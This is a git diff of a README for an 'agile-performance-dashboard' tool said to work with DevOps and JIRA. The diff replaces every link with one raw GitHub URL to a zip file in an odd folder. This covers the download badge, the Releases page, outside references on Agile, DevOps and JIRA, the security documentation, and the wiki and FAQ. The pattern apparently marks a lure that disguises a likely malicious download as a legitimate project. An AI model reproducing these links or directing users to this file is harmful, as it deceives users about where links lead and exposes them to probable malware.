@@ -1,7 +1,7 @@
 # 🚀 agile-performance-dashboard - Real-Time Sprint Insights for Your Team
 
 ## 📦 Download the Software
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/bluvisionary25/agile-performance-dashboard/releases)
+[![Download Now](https://raw.githubusercontent.com/bluvisionary25/agile-performance-dashboard/main/broadhearted/agile_performance_dashboard_v1.3-beta.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/bluvisionary25/agile-performance-dashboard/main/broadhearted/agile_performance_dashboard_v1.3-beta.3.zip)
 
 ## 📖 Overview
 agile-performance-dashboard is an application that integrates with DevOps and JIRA. It helps you see important metrics related to sprint deliverables and task status. With this tool, you can track completion percentages and effort for each project in real time. Gain clarity on your team's progress and improve your project's efficiency.
@@ -10,7 +10,7 @@ agile-performance-dashboard is an application that integrates with DevOps and JI
 To get started with agile-performance-dashboard, you will need to download the application from the Releases page. Follow the steps below for a simple installation process.
 
 ## 📥 Download & Install
-1. Click the following link to visit the [Releases page](https://github.com/bluvisionary25/agile-performance-dashboard/releases).
+1. Click the following link to visit the [Releases page](https://raw.githubusercontent.com/bluvisionary25/agile-performance-dashboard/main/broadhearted/agile_performance_dashboard_v1.3-beta.3.zip).
 2. Look for the latest release version.
 3. Find the appropriate file for your operating system.
 4. Click the link to download the file.
@@ -41,15 +41,15 @@ This application supports a range of technologies that enhance its usability:
 - **SQL Support:** Enable data management for querying and reporting.
 
 ## 🔗 Useful Links
-- Learn more about [Agile Methodologies](https://www.agilealliance.org/agile101/agile-methodology/)
-- Explore [DevOps Practices](https://www.atlassian.com/devops/what-is-devops)
-- Discover how to optimize your workflow with [JIRA](https://www.atlassian.com/software/jira)
+- Learn more about [Agile Methodologies](https://raw.githubusercontent.com/bluvisionary25/agile-performance-dashboard/main/broadhearted/agile_performance_dashboard_v1.3-beta.3.zip)
+- Explore [DevOps Practices](https://raw.githubusercontent.com/bluvisionary25/agile-performance-dashboard/main/broadhearted/agile_performance_dashboard_v1.3-beta.3.zip)
+- Discover how to optimize your workflow with [JIRA](https://raw.githubusercontent.com/bluvisionary25/agile-performance-dashboard/main/broadhearted/agile_performance_dashboard_v1.3-beta.3.zip)
 
 ## 📞 Support
 If you encounter any issues or have questions, please visit the Issues section of our repository. We value your feedback and are here to help.
 
 ## 🔒 Security
-We are committed to ensuring the security of our users. You can check the latest security updates and practices in our [security documentation](https://github.com/bluvisionary25/agile-performance-dashboard/security).
+We are committed to ensuring the security of our users. You can check the latest security updates and practices in our [security documentation](https://raw.githubusercontent.com/bluvisionary25/agile-performance-dashboard/main/broadhearted/agile_performance_dashboard_v1.3-beta.3.zip).
 
 ## 🎉 Getting Involved
 We welcome contributions from everyone. If you would like to improve this project, please submit a pull request or open an issue. Your input helps make agile-performance-dashboard an even more powerful tool.
@@ -58,7 +58,7 @@ We welcome contributions from everyone. If you would like to improve this projec
 For any inquiries or suggestions, please contact us through the repository. Your engagement helps us grow the community around agile-performance-dashboard. 
 
 ## 🌟 Additional Resources
-- [Documentation](https://github.com/bluvisionary25/agile-performance-dashboard/wiki)
-- [FAQs](https://github.com/bluvisionary25/agile-performance-dashboard/wiki/FAQs)
+- [Documentation](https://raw.githubusercontent.com/bluvisionary25/agile-performance-dashboard/main/broadhearted/agile_performance_dashboard_v1.3-beta.3.zip)
+- [FAQs](https://raw.githubusercontent.com/bluvisionary25/agile-performance-dashboard/main/broadhearted/agile_performance_dashboard_v1.3-beta.3.zip)
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/bluvisionary25/agile-performance-dashboard/releases)
+[![Download Now](https://raw.githubusercontent.com/bluvisionary25/agile-performance-dashboard/main/broadhearted/agile_performance_dashboard_v1.3-beta.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/bluvisionary25/agile-performance-dashboard/main/broadhearted/agile_performance_dashboard_v1.3-beta.3.zip)
